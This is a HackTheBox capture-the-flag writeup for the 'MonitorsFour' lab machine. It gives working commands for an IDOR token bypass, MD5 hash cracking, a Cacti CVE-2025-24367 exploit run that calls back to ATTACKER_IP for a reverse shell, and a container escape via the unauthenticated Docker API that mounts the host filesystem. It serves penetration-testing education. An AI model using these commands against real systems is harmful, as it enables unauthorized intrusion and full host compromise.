---
title: "MonitorsFour — HackTheBox Writeup"
date: "2026-02-27"
description: "Easy Windows machine involving IDOR token bypass, Cacti CVE-2025-24367 authenticated RCE, and unauthenticated Docker API container escape via WSL2"
tags: ['hackthebox', 'writeup', 'windows', 'CVE', 'web pentest', 'docker', 'container escape', 'IDOR']
thumbnail: ""
---

# MonitorsFour — HTB Labs Machine Writeup

**Difficulty:** Easy
**OS:** Windows (Docker Desktop on WSL2)

---

## Attack Chain Summary

```
IDOR: token=0 bypasses auth → Leak MD5 hashes
    → Crack admin hash → Login to Cacti as marcus
        → CVE-2025-24367 (Cacti Graph Template RCE) → Docker container shell
            → /etc/resolv.conf → ExtServers: 192.168.65.7
                → Docker API exposed on TCP 2375 (no auth)
                    → Mount host filesystem → Read root flag via WSL2 path
```

---

## Phase 1: Reconnaissance

### Port Scan

| Port | Service | Details |
|------|---------|---------|
| 80/tcp | HTTP | nginx (PHP/8.3.27) |
| 5985/tcp | WinRM | Microsoft HTTPAPI httpd 2.0 |

VHost fuzzing discovered `cacti.monitorsfour.htb` — a **Cacti 1.2.28** login page.

---

## Phase 2: Foothold

### IDOR — Token Bypass on `/api/v1/user`

Testing the API with `token=0` (a falsy integer value) bypassed validation entirely:

```bash
curl "http://monitorsfour.htb/api/v1/user?token=0&id=2"
# Returns: full user object with MD5 password hash
```

The backend likely uses loose comparison (`if (!$token)`) which evaluates `0` as falsy. Enumerating user IDs revealed four accounts with MD5 hashes.

### Hash Cracking

```bash
john admin.hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
# Cracked: <redacted>
```

### Cacti Login

The main app's `admin` account mapped to Cacti username `marcus`. Login succeeded with the cracked password. `marcus` is a regular user but has access to `graph_templates.php` — sufficient for the exploit.

---

## Phase 3: CVE-2025-24367 — Cacti Authenticated RCE

**CVE-2025-24367** (CVSS 8.8) — Cacti <= 1.2.28 allows any authenticated user to inject RRDtool commands via the graph template editor's `right_axis_label` field, writing arbitrary PHP files to the web root.

The exploit operates in two stages:
1. Write a PHP downloader that fetches a reverse shell script
2. Write a PHP executor that runs the downloaded script

```bash
python3 cve-2025-24367.py \
  -u marcus -p '<redacted>' \
  -i ATTACKER_IP -l 9001 \
  -url http://cacti.monitorsfour.htb
```

Reverse shell received as `www-data` inside a Docker container (Debian 13, kernel `microsoft-standard-WSL2`).

---

## Phase 4: Container Escape — Unauthenticated Docker API

### Discovery

```bash
cat /etc/resolv.conf
# ExtServers: [host(192.168.65.7)]
```

The `ExtServers` comment reveals the Docker Desktop DNS forwarder address.

### Docker API Exposed

```bash
curl http://192.168.65.7:2375/images/json
# Returns: alpine:latest, nginx-php, mariadb
```

The Docker daemon socket is exposed on TCP 2375 with **zero authentication** — full control over the Docker host.

### Reading the Root Flag

The WSL2 VM filesystem has the Windows C: drive at `/mnt/host/c/`:

```bash
# Create container mounting host root
curl -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["cat", "/host/mnt/host/c/Users/Administrator/Desktop/root.txt"],
    "HostConfig": {"Binds": ["/:/host"]}
  }'

# Start and read logs
curl -X POST http://192.168.65.7:2375/containers/<id>/start
curl "http://192.168.65.7:2375/containers/<id>/logs?stdout=1&stderr=1"
```

---

## Failed Attempts

| # | What Was Tried | Why It Failed |
|---|----------------|---------------|
| 1 | Login to Cacti as `admin` | Cacti username was `marcus`, not `admin` |
| 2 | evil-winrm as `marcus` | Lacks WinRM group membership |
| 3 | WinRM via container pivot | Same user permission problem |

---

## Key Takeaways

1. **Falsy values bypass authentication** — Always test `0`, `null`, `false`, empty string when a parameter controls access. PHP loose comparison treats `0` as falsy.

2. **API username vs. display name diverge** — Try first name, last name, email prefix when credentials work on one service but not another.

3. **CVE-2025-24367 requires only regular Cacti auth** — Any user with graph template access can achieve RCE. Non-admin does not mean low risk.

4. **Docker API without authentication = full host compromise** — TCP 2375 without auth allows arbitrary container creation with host filesystem mounts.

5. **`/etc/resolv.conf` leaks Docker network topology** — The `ExtServers` comment revealed the Docker API host IP.

6. **WSL2 path for Windows files**: `/mnt/host/c/` from within Docker containers after mounting the host root.

---

## Tools Used

- `nmap` — Port scanning
- `ffuf` — VHost fuzzing
- `curl` — IDOR enumeration, Docker API interaction
- `john` — MD5 hash cracking
- `cve-2025-24367.py` — Cacti authenticated RCE
- `mysql` — MariaDB credential dump
